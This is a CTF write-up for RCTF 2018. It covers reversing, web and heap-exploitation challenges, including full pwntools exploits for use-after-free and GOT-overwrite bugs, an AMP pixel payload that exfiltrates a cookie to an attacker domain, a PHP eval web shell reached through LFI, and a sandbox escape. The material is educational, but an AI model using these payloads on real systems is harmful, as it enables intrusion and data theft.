                                                                          * (2
                                                                           * (((a1 >> 20) & 1)
                                                                            + 2
                                                                            * (2 * ((a1 & 0x80000000) != 0)
                                                                             + ((a1 >> 26) & 1)))
                                                                           + ((a1 >> 9) & 1))))) << 31);
  }
  return a1;
}
```

As you can see, a3, a4 and a5 are only used to produce s, which is never used again and can thus be ignored. All we're left with is the big for loop which modifies a1, the character the function is working on. Instead of writing a reverse function for this loop I just used a lookup table, thus solving the challenge with this code (yes, it's kind of ugly, but it works):

```cpp
#include <cstdio>
#include <cstdint>
#include <bits/stdc++.h>
using namespace std;

uint32_t f(uint32_t a1)
{
        uint32_t j;
        uint64_t a2 = 0x1D082C23A72BE4C1LL, v5;
        for ( j = 0; j <= 0x20F; ++j )
        {
                v5 = a2 >> (j & 0x1F);
                if ( j & 0x20 )
                        v5 = v5 >> 32;
                a1 = (a1 >> 1) ^ (((unsigned int)v5 ^ a1 ^ (a1 >> 16) ^
                                                        (0x5C743A2E >> (((a1 >> 1) & 1) + 2 * (2 * (((a1 >> 20) & 1)
                                                        + 2 * (2 * ((a1 & 0x80000000) != 0) + ((a1 >> 26) & 1)))
                                                        + ((a1 >> 9) & 1))))) << 31);
        }
        return a1;
}

int main()
{
        map<string, char> m;
        for(uint32_t i = 0; i <= 0xFF; i++)
        {
                char buf[10];
                sprintf(buf, "%08X", f(i));
                m[string(buf)] = i;
        }
        
        char out[32];
        ifstream s("out");
        for(int i = 0; i < 30; i++)
        {
                string l;
                s >> l;
                if(m.find(l) == m.end())
                        printf("WUT\n");
                out[i] = m[l];
        }
        out[30] = 0;
        printf("%s\n", out);
}
```

Which prints `RCTF{Kee1o9_1s_a1ready_so1ved}`, our flag.

Just a small detail: I had to break the lines in the `out` file up into 8 character chunks manually, they were in 16 byte lines for some reason.




Sign
---

We are given a 64 bit elf that segfaults on execution.
By running a good old-fashioned
```
strings --encoding=l sign.exe |grep RCTF
```
we get the flag `RCTF{WelCOme_To_RCTF}`

AMP
---

We are given a page with an obsvious XSS and a quite strict CSP policy.
You can submit the page with the injection to the admin. A cookie `FLAG` is set, which probably means we have to steal that cookie from the admin.

The page is using [AMP](https://www.ampproject.org/), so we are going to look for a way to bypass the CSP using an AMP custom element.
AMP has a feature that allows you to insert some placeholders into a URL that are populated by javascript at runtime, called: https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md
The feature we need is `CLIENT_ID`, that populates the placeholder with the value of a cookie. In our case: `CLIENT_ID(FLAG)` will be replaced by the flag value.
At this point, we just need an AMP element available in the default package and capable of loading a URL using variable substitutions. 
We quickly found [amp-pixel](https://www.ampproject.org/docs/reference/components/amp-pixel), that does just that.

Our final payload was:
```
<amp-pixel src="https://controlled_domain.com/?CLIENT_ID(FLAG)" layout="nodisplay"></amp-pixel>
```

And the flag: `RCTF{El_PsY_CONGRO0_sg0}`

RNote3
---
[Attachment](https://drive.google.com/open?id=1yKlHMJG35GtjuwckrkYuMW7ps2bEYF5k)
### First checks:

RNote3: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3ec425669dba0efe3033ff8bffdb0b4a9eb9ee4e, stripped
 '/home/marcof/ctfs/rctf2018/rnote/RNote3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

### Reversing

We reversed all the binary with no particular problems. We started looking for some bugs in heap managment but everythink looked fine. We noticed sub_B98( ) (which i renominated custom_read(buff,size)) wasn't perfect,
in fact it would stop reading characters once a \n was reached but it would still add a \x00 at buff[size - 1]. Also we soon found a stack buffer overflow in sub_102D() (edit_note()). Still canary was preventing us to take control
over the $rip.

### The right vuln

After some time we finally found a usable vulnerability. In function delete_note() (sub_F2B(), refer to decompiled code below) stack variable "selected_note" is not initialized to 0 and its loaded at $rbp - 0x18, exactly as it is in
edit_note() function. This means that if i first call edit_note() on one of my allocated structures (note structure also provided below), lets say with title "aaa\n" and later call delete_note() looking for a structure with a non existing
 title ("\n")  I would end up freeing the "aaa\n" note without setting to 0 the respective global pointer saved in .bss segment. This its clearly a use after free vulnerability. 

```c
unsigned __int64 delete_note()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  note *selected_note; // [rsp+8h] [rbp-18h]
  char note_title; // [rsp+10h] [rbp-10h]
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  printf("please input note title: ");
  my_custom_read(&note_title, 8u);
  for ( i = 0; i <= 31; ++i )
  {
    if ( notes[i] && !strncmp(&note_title, notes[i]->title, 8uLL) )
    {
      selected_note = notes[i];
      break;
    }
  }
  if ( selected_note )
  {
    free(selected_note->content);
    free(selected_note);
    notes[i] = 0LL;
  }
  else
  {
    puts("not a valid title");
  }
  return __readfsqword(0x28u) ^ canary;
}
```

```c
struct note
{
  char title[8];
  __int64 size;
  char *content;
};
```

### Exploitation

Using the newly found vulnerability we were able to both leak libc and heap addresses usign the unsorted chunk fd and bk pointers which are saved on the heap after a call to free().
Libc was provided so it was easy to calculate offsets to system() function. Once we got a heap address we were able to craft a fake big chunk inside the double linked list of 
unsorted ones to make it overlap existing note structures, change their "content" pointer and gain arbitrary write.The final step is trivial, we overwrite free_hook(), we put a "/bin/sh\x00" 
string inside a note content, we free such note.

### Final exploit with some comments

```python
from pwn import *
from time import sleep
import sys
import os

# context.log_level = "debug"

host = 'localhost'
port = 4000

host_remote = "rnote3.2018.teamrois.cn"
port_remote = 7322

binary_path = './RNote3'
libc_path = './libc.so.6'

start_gdb = False
gdb_cmds = """
source /home/marcof/peda/peda.py
# sbp 0xf5b
# sbp 0xfe2
b system
c
"""

if libc_path is not None:
        libc = ELF(libc_path)
if binary_path is not None:
        elf = ELF(binary_path)

mode = sys.argv[1] if len(sys.argv) > 1 else ''
if mode == 'remote':
                r = remote(host_remote,port_remote)
elif mode == 'local':
                r = remote(host,port)
else:
        r = process('./RNote3')
        if start_gdb:
                if(os.environ.get('TMUX',False)):
                        context.terminal = ['tmux', 'splitw', '-h']
                        gdb.attach(r,gdb_cmds)
                else:
                        log.warning('Start a tmux session to get gdb attached!')

def new_note(note_title,note_size,note_content):
        r.sendline('1')
        r.recvuntil("input title: ")
        r.send(note_title)
        r.recvuntil("content size: ")
        r.sendline(str(note_size))
        r.recvuntil(" input content: ")
        r.send(note_content)

def view_note(note_title):
        r.sendline('2')
        r.recvuntil("note title: ")
        r.send(note_title)
        r.recvuntil("title: ")
        title = r.recvuntil("note cont")[:-9]
        r.recvuntil("ent: ")
        content = r.recvuntil('\n')[:-1]
        return(title,content)

def edit_note(note_title,new_content):
        r.sendline('3')
        r.recvuntil("input note title: ")
        r.send(note_title)
        r.recvuntil(" new content: ")
        r.send(new_content)

def delete_note(note_title):
        r.sendline('4')
        r.recvuntil("note title: ")
        r.send(note_title)

def exit():
        r.sendline('5')

r.recvuntil("5. Exit")

## BEGIN EXPLOIT

libc_base_offset = 0x3c4b78  ##computed manually looking at 3-4 executions with gdb


## LIBC LEAK 
new_note("aaa\n",200,"A"*200)
new_note("bbb\n",200,"B"*200)
edit_note("aaa\n","X"*200)
delete_note("S\n") ## we use a non existing title to trigger vulnerability
libc_leak = view_note("\n")[1]
libc_leak = u64(libc_leak.ljust(8,'\x00'))
libc_base_eff = libc_leak - libc_base_offset
system_eff = libc_base_eff + libc.symbols['system']
free_hook_eff = libc_base_eff + libc.symbols['__free_hook']
log.info("libc leak:      {}".format(hex(libc_leak)))
log.info("libc base:      {}".format(hex(libc_base_eff)))
log.info("system addr:    {}".format(hex(system_eff)))
log.info("free_hook addr: {}".format(hex(free_hook_eff)))
## clean state - heap is fine and uncorrupted here, no free chunks are present

## HEAP LEAK
new_note("aaa\n",200,"/bin/sh\x00"+"A"*100+"\n")
new_note("ccc\n",240,"C"*240) ## I had to tune this value in order to make the next note_struct in the heap 
new_note("ddd\n",200,"D"*200) ## to start at something like 0x????00 and continue to exploit the same 
new_note("eee\n",200,"E"*200) ## vulnerability
new_note("fff\n",200,"F"*200)
delete_note("ddd\n")
edit_note("eee\n","Y"*200)
delete_note("S\n")
heap_leak = view_note("\n")[1]
heap_leak = u64(heap_leak.ljust(8,'\x00'))
log.info("heap leak:      {}".format(hex(heap_leak)))
new_note("ddd\n",200,"D"*200)
new_note("eee\n",200,"E"*200)
heap_top = heap_leak + 0x2b0
## clean state - heap is fine and uncorrupted here, no free chunks are present

## ARBITRARY WRITE
new_note("mmm\n",200,"M"*200)
new_note("nnn\n",200,"N"*200)
new_note("ooo\n",200,"O"*200)
new_note("ppp\n",200,"P"*200)
m_chunk = heap_leak + 0x2d0
n_chunk = m_chunk + 0xf0
o_chunk = n_chunk + 0xf0
p_chunk = o_chunk + 0xf0
edit_note("ooo\n","O"*200)
delete_note("S\n")
delete_note("mmm\n")
edit = p64(libc_leak) + p64(n_chunk + 0x20)
edit += "O"*(200-len(edit))
edit_note("\n",edit)
edit = "N"*16 + p64(0x00) + p64(0x111) 
edit += p64(o_chunk) + p64(m_chunk)
edit += "N"*(200-len(edit))
edit_note("nnn\n",edit)
edit = "Q"*0xb0 + p64(0x00) + p64(0x10) + p64(free_hook_eff) + "\n"
new_note("qqq\n",256,edit)
edit_note("\n",p64(system_eff)+"\n")
delete_note("aaa\n")


r.interactive()
```

### Flag
RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}



Simple re
-------

The given file seems at first malformed, having almost no sensible code and an entry point pointing outside of the defined sections. After a bit of debugging it became clear that a small loader would xor the code section with 0xCC and then jump to it. With this in mind I wrote a small script to undo the xor encryption and fix the entry point. Now it was time to actually reverse the logic inside and find the flag.

### The decoy
The first thing the program would do at startup is fork and split into a first thread that asked for the flag and checked it, a second one that, after playing around with some pthread calls, jumped back into a section of `main` previously unmarked by ida and basically wait for the first thread to trigger a debugger breakpoint. It was at this time that I fell for the decoy: I only considered the first thread only and fully reversed the encryption algorithm it used, only to get a nonprintable flag - how frustrating!

### Fixing it up
Afterwards we went back to the challenge with a teammate, focusing more on both threads. The first thread would encrypt the input and, before checking it, trigger an `int 3`, which the second thread was ready to catch (well, it wasn't when running the binary in IDA as no two debuggers can be attached at the same time, but you get the idea). This second thread then decrypted a checker function which ignored the previous encryption on the flag by using another copy of it and proceeded to, duh, check it.

The decryptor was this function:
```c
void __usercall __noreturn sub_400FDC(__int64 a1@<rbp>)
{
  *(_QWORD *)(a1 - 24) = sub_401482;
  *(_BYTE *)(a1 - 31) = 'R';
  *(_BYTE *)(a1 - 30) = 'i';
  *(_BYTE *)(a1 - 29) = 'g';
  *(_BYTE *)(a1 - 28) = 'h';
  *(_BYTE *)(a1 - 27) = 't';
  *(_BYTE *)(a1 - 26) = '!';
  *(_BYTE *)(a1 - 25) = '\0';
  for ( *(_QWORD *)(a1 - 8) = 0LL; *(_QWORD *)(a1 - 8) < 0x162uLL; ++*(_QWORD *)(a1 - 8) )
    *(_BYTE *)(*(_QWORD *)(a1 - 24) + *(_QWORD *)(a1 - 8)) ^= 0x28u;
  if ( (unsigned __int8)sub_401482(&qword_6020E0) )
    puts((const char *)(a1 - 31));
  if ( pid )
    kill(pid, 9);
  exit(0);
}
```

And, as said before, it xors the actual checker, `sub_401482`, with 0x28 before executing it on the flag. Let's have a look at the checker and the functions it uses, as that's where we can understand what the flag has to be.

```c
_BOOL8 __fastcall sub_401482(_DWORD *flag)
{
  int target[6]; // [rsp+8h] [rbp-40h]
  int mul[6]; // [rsp+28h] [rbp-20h]
  int v5; // [rsp+40h] [rbp-8h]
  int i; // [rsp+44h] [rbp-4h]

  mul[0] = 0x556E4969;
  mul[1] = 0x2E775361;
  mul[2] = 0x893DAE7;
  mul[3] = 0x96990423;
  mul[4] = 0x6CF9D3E9;
  mul[5] = 0xA505531F;
  target[0] = 0x54A0B9BD;
  target[1] = 0x4B818640;
  target[2] = 0x8EB63387;
  target[3] = 0xA9EABEFD;
  target[4] = 0xB8CDF96B;
  target[5] = 0x113C3052;
  for ( i = 0; i <= 5; ++i )
  {
    if ( mul[i] * flag[i] != target[i] )
      return 0LL;
  }
  if ( (unsigned int)check1(flag[6], *((unsigned __int16 *)flag + 14), 0xF64BB17D) != 1870842076
    || (unsigned int)check2(*((_WORD *)flag + 14), *((_WORD *)flag + 15)) != 42134 )
  {
    return 0LL;
  }
  v5 = 0;
  for ( i = 24; i <= 31; ++i )
    v5 ^= *((char *)flag + i);
  return v5 == 22 && *((_BYTE *)flag + 32) == 's';
}

unsigned __int64 __fastcall check1(unsigned int b, unsigned int e, unsigned int n)
{
  unsigned __int64 v5; // [rsp+Ch] [rbp-10h]
  unsigned __int64 res; // [rsp+14h] [rbp-8h]

  res = 1LL;
  v5 = b;
  while ( e )
  {
    if ( e & 1 )
      res = v5 * res % n;
    v5 = v5 * v5 % n;
    e >>= 1;
  }
  return res;
}

__int64 __fastcall check2(unsigned __int16 a, unsigned __int16 a2)
{
  unsigned __int16 v2; // ST16_2
  unsigned __int16 b; // [rsp+0h] [rbp-18h]

  for ( b = a2; b & a; b = 2 * (b & v2) )
  {
    v2 = a;
    a ^= b;
  }
  return (unsigned __int16)(b | a);
}
```

### Actual reversing

The first 6 dwords if the flag are checked by multiplying each one by a constant and checking against another constant, as it's all 32 bit it's nothing we can't bruteforce - 24 characters done.
The last byte is trivially an `s` - one more done.
The remaining 8 are a bit trickier, as I had to find a way to bruteforce them quickly enough. The first thing needed was reversing `check1` and `check2`. The first one is modular exponentiation, thus `check1(b, e, n) = (b**e) % n`. The second one looks messy with all those bit operations but it's nothing more than a sum modulo `2**16`. With this information in mind let's setup a bruteforce:
- Trying all 2**64 combinations is just too slow
- But thanks to check2 we know the sum of the last two 16bit chunks is 42134. Let's bruteforce only one and get the other
- 2**48 combinations is still too many...
- We know the xor of all 8 bytes is 22, we can thus only iterate over 3 of the remaining 4
- 2**40 combinations, we're getting onto something
- Let's only check printable characters, the ones in [0x20, 0x7F]
- That's less than 2**35 tests, feasible in a few seconds!

And so this mess was born, a mess that nonetheless gave us the flag:

```c
#include <cstdio>
#include <cstdint>

uint64_t check1(unsigned int a1, unsigned int a2, unsigned int a3)
{
        unsigned int v4; // [rsp+4h] [rbp-18h]
        uint64_t v5; // [rsp+Ch] [rbp-10h]
        uint64_t v6; // [rsp+14h] [rbp-8h]

        v4 = a2;
        v6 = 1LL;
        v5 = a1;
        while ( v4 )
        {
                if ( v4 & 1 )
                        v6 = v5 * v6 % a3;
                v5 = v5 * v5 % a3;
                v4 >>= 1;
        }
        return v6;
}

int main()
{
        uint32_t v9[] = {0x556E4969, 0x2E775361, 0x893DAE7, 0x96990423, 0x6CF9D3E9, 0xA505531F};
        uint32_t v3[] = {0x54A0B9BD, 0x4B818640, 0x8EB63387, 0xA9EABEFD, 0xB8CDF96B, 0x113C3052};
        
        char output[34] = {0};
        
        // Bruteforce the first 24 bytes
        for(int i = 0; i < 6; i++)
        {
                uint32_t val = 0;
                while(1)
                {
                        if(v9[i] * val == v3[i])
                        {
                                printf("%02X%02X%02X%02X", val & 0xFF, (val >> 8) & 0xFF, (val >> 16) & 0xFF, (val >> 24) & 0xFF);
                                ((uint32_t *)output)[i] = val;
                        }
                        val++;
                        if(val == 0) break;
                }
        }
        
        // v0, v1, ..., v7 are the 8 bytes we're looking for
        for(uint32_t v4 = 0x20; v4 <= 0x7F; v4++)
        {
                printf("v4 %d\n", v4);
                for(uint32_t v5 = 0x20; v5 <= 0x7F; v5++)
                {
                        uint32_t v45 = v4 | (v5 << 8);
                        uint32_t v67 = (42134 - v45 + 0x10000) & 0xFFFF;
                        uint32_t v6 = v67 & 0xFF, v7 = (v67 >> 8) & 0xFF;
                        if(v6 < 0x20 || v6 > 0x7F || v7 < 0x20 || v7 > 0x7F) continue;
                        
                        uint32_t x = v4 ^ v5 ^ v6 ^ v7;
                        
                        for(uint32_t v0 = 0x20; v0 <= 0x7F; v0++)
                        {
                                for(uint32_t v1 = 0x20; v1 <= 0x7F; v1++)
                                {
                                        for(uint32_t v2 = 0x20; v2 <= 0x7F; v2++)
                                        {
                                                uint32_t x1 = v0 ^ v1 ^ v2;
                                                uint32_t v3 = x ^ x1 ^ 22;
                                                
                                                if(v3 < 0x20 || v3 > 0x7F) continue;
                                                
                                                uint32_t v0123 = v0 | (v1 << 8) | (v2 << 16) | (v3 << 24);
                                                if(check1(v0123, v45, 0xF64BB17D) == 0x6F82C8DC)
                                                {
                                                        ((uint32_t *)output)[6] = v0123;
                                                        ((uint16_t *)output)[14] = v45;
                                                        ((uint16_t *)output)[15] = v67;
                                                        // Sorry Dijkstra, I'm using a goto...
                                                        goto fi;
                                                }
                                        }
                                }
                        }
                }
        }
        fi:;
        output[32] = 's';
        output[33] = 0;
        printf("RCTF{\%s}\n", output);
}
```

In just a few seconds it prints out `RCTF{5o_M@ny_an7i_Rev3rsing_Techn!qu3s}`. Done!


RNote4
------
[Attachment](https://drive.google.com/open?id=1xL3tT2ttR2BJJsUi7kgoe13Nb2Ff5LXF)
**Disclaimer:** this is an unintended solution.
No PIE and no leaks, it's evidently intended to be exploited via dl-resolve.
Looks like I had a brain fart and didn't think about that.

### Overview

We're given a 64-bit Linux ELF. Checksec shows canaries and NX, but no RELRO and PIE.

The binary's main loop reads a choice byte from stdin, and executes an action based on it.

Option 1 allocates a note:

```c
struct note {
    size_t size;
    char *ptr;
};

void allocate()
{
    unsigned __int8 size;
    int i;
    struct note *note;

    if (g_num_notes > 32)
        exit(-1);
    size = 0;

    note = calloc(sizeof(struct note), 1);
    if (!note)
        exit(-1);

    read_exactly(&size, 1);
    if (!size)
        exit(-1);
    note->ptr = calloc(size, 1);
    if (!note->ptr)
        exit(-1);
    read_exactly(note->ptr, size);
    note->size = size;

    for (i = 0; i <= 31 && g_notes[i]; ++i);
    g_notes[i] = note;
    ++g_num_notes;
}
```

Options 2 edits a note:

```c
void edit()
{
    unsigned __int8 idx;
    unsigned __int8 read_size;
    struct note *note;

    idx = 0;
    read_exactly(&idx, 1);
    if ( !g_notes[idx] )
        exit(-1);
    note = g_notes[idx];

    read_size = 0;
    read_exactly(&read_size, 1);
    read_exactly(note->ptr, read_size);
}
```

Option 3 deletes a note:

```c
void delete()
{
    unsigned __int8 idx;

    idx = 0;
    read_exactly(&idx, 1);
    if (idx > 32)
        exit(-1);

    free(g_notes[idx]->ptr);
    free(g_notes[idx]);
    g_notes[idx] = 0;
}
```

### Vulnerability

There's an evident buffer overflow in the edit option.
It reads a size up to 255 bytes, and then reads that many bytes into the note, without regard for the note's allocated size.

### Exploitation

We allocate a couple notes to get the second note's `struct note` after the first note's buffer. By overflowing from the first note's buffer into the second note's `struct note`, we can control the second note's `ptr` and obtain arbitrary write via edit.
However, we have no leaks.

I decided to do a partial overwrite of a GOT entry.
I assumed the libc was the same as the other challenges (`2.23-0ubuntu10`).
There's a GOT entry for `alarm`, which is close to the `exec*` family in libc: they differ in the lower 16 bits.
Since the low 12 bits are not affected by ASLR, this is a 4 bit bruteforce, which is absolutely feasible.
We need to make sure `alarm` has been lazy linked.
It's used at the beginning of `main`, before the actions loop:

```c
if (argc > 1) {
    v3 = atoi(argv[1]);
    alarm(v3);
}
```

This will be used on the remote server to set a timeout for the process, so `alarm` will be already resolved by the time we overwrite the GOT.

While `alarm` can be hijacked to an `exec*` function, there are a couple issues.
It's not called after the corruption, and the arguments wouldn't match anyway.
Therefore, I built a chain of corrupted GOT entries to perform an `execv` call.

The binary contains this initialization function (called at the beginning of `main`):

```
void __cdecl initialize()
{
  memset(g_notes, 0, 256);
  g_num_notes = 0;
  setvbuf(stdin, 0, 2, 0);
}
```

Remember that `g_notes` is in BSS (no PIE).
Also, we know we can easily trigger a `free` at will through option 3.

The final sequence is:
- write `/bin/sh\x00` to `g_notes`;
- partially overwrite `alarm`'s GOT entry with `execv` (guessing 4 bits);
- overwrite `memset`'s GOT entry with `alarm`'s PLT entry;
- overwrite `free`'s GOT entry with the address of `initialize`.

Now we call `free`, which is hijacked to `initialize`.
The call to `memset(g_notes, 0, 256)` will actually go through `alarm`'s PLT and end up calling `execv(g_notes, NULL)`, which will pop a shell since `g_notes` contains `/bin/sh\x00`.

```
$ cat flag
RCTF{I_kn0w_h0w_dl_f1xup_w0rks_503f8c}
```

Yeah, that's not exactly what I did.
It was meant to be solved via dl-resolve.

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *

context(os='linux', arch='x86_64')

def menu(n):
    p.send(p8(n))

buffers = [False] * 32

def reset():
    global buffers
    buffers = [False] * 32

def allocate(content):
    menu(1)
    p.send(p8(len(content)))
    p.send(content)
    idx = buffers.index(False)
    buffers[idx] = True
    return idx

def edit(idx, content):
    menu(2)
    p.send(p8(idx))
    p.send(p8(len(content)))
    p.send(content)

def delete(idx):
    menu(3)
    p.send(p8(idx))
    buffers[idx] = False

INITIALIZE = 0x400ad2
BUFFERS = 0x6020c0
ALARM_GOT = 0x602030
ALARM_PLT = 0x400650
MEMSET_GOT = 0x602028
FREE_GOT = 0x602018
EXECV_LOW = 0x860

prog = log.progress('Bruteforcing execv')
while True:
    p = remote('rnote4.2018.teamrois.cn', 6767)

    reset()
    allocate('A') # avoids messing with corrupted idx 0
    overflow = allocate('A')
    victim = allocate('A')

    def write(addr, data):
        edit(overflow, 'A'*0x18 + p64(0x21) + p64(31337) + p64(addr))
        edit(victim, data)

    try:
        # pwn got
        write(BUFFERS, '/bin/sh\x00')
        write(ALARM_GOT, p16(EXECV_LOW)) # guess 4bit = 0
        write(MEMSET_GOT, p64(ALARM_PLT))
        write(FREE_GOT, p64(INITIALIZE))
        # free(...) -> memset(BUFFERS, 0, 256) -> execv(BUFFERS, 0)
        delete(overflow)
        p.sendline('echo PWNED')
        if 'PWNED' in p.recvline(timeout=1):
            prog.success()
            log.info('Dropping to shell')
            p.interactive()
            break
    except EOFError:
        pass

    p.close()
```

backdoor
--------

### Overview
We are given the `control.sh` from the compiler challenge:
```bash
#!/bin/bash
# No, flag is not hidden in this file
# This's entrypoint of backdoor, web
# From here, `compiler` and `backdoor` are independent
# Now dear web player, have fun~

debuggers=$(ps auxf | grep "wireshark\|tshark\|idaq\|strace\|gdb\|edb\|lldb\|lida\|hopper\|r2\|radare2" | grep -v grep | wc -l)
if [ "$debuggers" -ge "0" ]
then
    curl -d "Oh, no! He's debugging! I'll kill them!!!!!!" -H "User-Agent: $(uname -a)" http://backdoor.2018.teamrois.cn/post.php?action=debugging\&count=$debuggers
fi
killall -9 wireshark
killall -9 tshark
killall -9 idaq
killall -9 strace
killall -9 gdb
killall -9 edb
killall -9 lldb
killall -9 lida
killall -9 hopper
killall -9 r2
killall -9 radare2

head -c100000 /dev/urandom > /tmp/random.txt
zip -r - /tmp/random.txt | curl -H "User-Agent: $(uname -a)" -F 'file=@-' http://backdoor.2018.teamrois.cn/post.php\?action\=upload -v
rm /tmp/random.txt

echo "Did you find the backdoor?" > ~/rctf-backdoor.txt
```

Here we can see two entry points for this challenge:
`http://backdoor.2018.teamrois.cn/post.php?action=upload`
and 
`http://backdoor.2018.teamrois.cn/post.php?action=debugging&count=$debuggers`.

The upload action takes a `.zip` file as input, and loads it to the `uploads/` directory with a random name. The debugging action seems to be useless.
Both these two pages, at a first sight, may save the user-agent.

There is also a index.php page, with a wordpress-like login, but it seems pretty useless.

### Local file inclusion

After some tries, we see that if we prepend a `./` to the action parameter, that page loads normally. This means we have a local file inclusion, and after some other successful experiments (like requesting `/upload.php` or `post.php?action=index`) we understood that it includes the page from the same directory, appending a `.php` extension to the value that we requested.
The `http://` wrapper and the `data:` wrapper didn't work. But wait, we have a file upload!

### Remote code execution

We can upload arbitrary .zip files. So we can zip a `bk.php` file, use PHP's `zip:` wrapper, and then include our `bk.php` file.
Our `bk.php` is very simple:

```php
<?php eval($_GET['cmd']);
```

We upload it, take its name, and include it with the following request:

```
http://backdoor.2018.teamrois.cn/post.php?action=zip://./uploads/"+hash+"%23bk&cmd=system('cat *');
```

Where hash is the name of the uploaded zip. This request will print the flag: RCTF{the_way_1t_leAds_mE_To_be_In_1ove}



r-cursive
---------

### Overview

> LUL dat font
> http://r-cursive.ml

Hint:
> If you get stuck after arbitrary code execution, try to escape the sandbox. phpinfo may help you figure out how the sandbox works.

### Remote Code Execution

Going to `http://r-cursive.ml` gives us a page with the following source code:

```php
<?php
$token = sha1($_SERVER['REMOTE_ADDR']);
$dir = '../sandbox/'.$token.'/';
is_dir($dir) ?: mkdir($dir);
is_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));
switch($_GET['action'] ?: ''){
    case 'go':
        header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');
        break;
    case 'reset':
        system('rm -rf '.$dir);
        break;
    default:
        show_source(__FILE__);
}
?>
```

If we visit `http://r-cursive.ml/?action=go`, it will create a directory in a sandboxed environment and it will put a `index.php` file in it with the following code:

```php
<?php
sha1($_SERVER['REMOTE_ADDR']) === '#SHA1#' ?: die();
';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
```

Finally, it will redirect us to that page, located at `*token*.sandbox.r-cursive.ml:1337/`.

Here there is an obvious arbitrary code execution, if we manage to bypass the filter...
Looking at the regex, we understand that it will only accept code in the form of `foo(bar(...))`, with an arbitrary number of nested function calls, where the outer function takes the inner function's return value as its only parameter. To execute code we can use `eval()`, but we need to find a way to pass an arbitrary string to it. Googling a bit, we came across `getallheaders()`, a nice function that returns an array containing all the request headers. Now that we have arbitrary input, we only need to `implode()` the array to have a string, and then pass it to `eval()`. The final payload is an HTTP request like this:

```
GET /?cmd=eval(implode(getallheaders())); HTTP/1.1 
    a: print('Hello world!'); // 
    Host: *token*.sandbox.r-cursive.ml:1337
```

And now, where is the flag? 

### Sandbox escape

We are inside a sandbox, with all the useful function like `system` or `exec` disabled by `php.ini`, and with a strict `open_basedir`.
About `open_basedir`, we see in the `phpinfo()` that it is restricted only to `/tmp` and to our sandbox, that is in the form of `sandbox/*token*`. In `/tmp` or in our sandbox there isn't anything useful. In the `phpinfo()` we noticed than there is a preloaded file, `sandbox/init.php`. What if this `init.php` is the file responsible for the `open_basedir` restriction? 
So I tried to play with the DNS wildcard, to see if I could escape from the sandbox from there. We tried deleting the token, and the server responded with a 404... that's interesting. And then I tried requesting `init.php`... 200! Bingo, we are outside the sandbox. We then requested the `index.php` inside our sandbox, and indeed the `open_basedir` now points only to `sandbox/` and `/tmp`. I then read the `init.php` file, finding the flag inside: `RCTF{apache_mod_vhost_alias_should_be_configured_correctly}`.

Final payload:

```
GET /*token*/?cmd=eval(implode(getallheaders())); HTTP/1.1 
    A: print(file_get_contents('../init.php')); // 
    Host: .sandbox.r-cursive.ml:1337
```